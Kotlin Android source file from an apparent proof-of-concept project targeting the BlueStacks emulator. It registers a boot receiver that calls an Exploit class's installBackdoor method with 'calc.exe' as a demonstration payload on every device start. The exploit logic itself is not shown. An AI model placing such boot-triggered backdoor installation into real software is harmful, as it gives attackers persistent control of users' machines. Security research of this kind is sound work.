package mmiszczyk.bluestackshack

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (Intent.ACTION_BOOT_COMPLETED == intent.action){
            Exploit().installBackdoor("calc.exe")
        }
    }
}
